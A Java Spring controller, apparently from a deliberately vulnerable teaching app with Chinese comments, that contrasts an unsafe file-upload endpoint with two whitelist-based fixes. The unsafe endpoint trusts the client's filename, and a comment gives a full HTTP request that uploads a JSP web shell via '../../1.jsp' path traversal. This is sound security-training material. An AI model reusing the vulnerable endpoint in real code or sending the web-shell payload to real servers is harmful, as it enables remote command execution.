package com.example.vulnerablejava.controller;

import java.io.File;
import java.io.IOException;
import java.util.UUID;

import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.multipart.MultipartFile;

import io.swagger.annotations.Api;
import io.swagger.annotations.ApiOperation;

@Api(tags = "任意文件上传漏洞")
@RestController
@RequestMapping("upload")
public class UploadController {

    /**
     * 存在任意文件上传漏洞，攻击者发送如下数据包上传文件，通过修改filename参数，即可上传JSP木马到任意目录
     *
        POST /upload/1 HTTP/1.1
        Host: 127.0.0.1:8080
        Content-Type: multipart/form-data; boundary=------------------------qazwsx
        Content-Length: 224

        --------------------------qazwsx
        Content-Disposition: form-data; name="file"; filename="../../1.jsp"
        Content-Type: text/plain

        <%Runtime.getRuntime().exec(request.getParameter("i"));%>
        --------------------------qazwsx--
     * @throws IOException
     * @throws IllegalStateException
     */
    @ApiOperation("存在任意文件上传漏洞")
    @PostMapping("1")
    public String upload(MultipartFile file) throws IllegalStateException, IOException {
        String fileName = file.getOriginalFilename();
        String dataDir = System.getProperty("user.dir");
        File localFile = new File(dataDir, fileName);
        file.transferTo(localFile);
        return localFile.getAbsolutePath();
    }

    /**
     * 修复任意文件上传漏洞，使用白名单对文件后缀名进行校验，并重命名文件
     * @throws IOException
     * @throws IllegalStateException
     */
    @ApiOperation("修复任意文件上传漏洞")
    @PostMapping("safe")
    public String safeUpload(MultipartFile file) throws IllegalStateException, IOException {
        String fileName = file.getOriginalFilename();
        if (checkParameter(fileName)) {
            String suffix = fileName.substring(fileName.lastIndexOf("."));
            String dataDir = System.getProperty("user.dir");
            File localFile = new File(dataDir, UUID.randomUUID().toString() + suffix);
            file.transferTo(localFile);
            return localFile.getAbsolutePath();
        } else {
            return "参数不合法";
        }
    }

    /**
     * 修复任意文件上传漏洞，使用白名单对文件后缀名进行校验，创建临时文件
     * @throws IOException
     */
    @ApiOperation("修复任意文件上传漏洞")
    @PostMapping("safe2")
    public String safeUpload2(MultipartFile file) throws IOException {
        String fileName = file.getOriginalFilename();
        if (checkParameter(fileName)){
            String suffix = fileName.substring(fileName.lastIndexOf("."));
            File tempFile = File.createTempFile("tmp", suffix);
            tempFile.deleteOnExit();
            file.transferTo(tempFile);
            return tempFile.getAbsolutePath();
        } else {
            return "参数不合法";
        }
    }

    public static boolean checkParameter(String fileName) {
        String[] fileTypeWhiteList = {".xls", ".xlsx", ".csv"}; // 文件类型白名单
        for (String fileType : fileTypeWhiteList) {
            if (fileName.endsWith(fileType) && !fileName.contains("..") && !fileName.contains("/") && !fileName.contains("\\")) {
                return true;
            }
        }
        return false;
    }
}
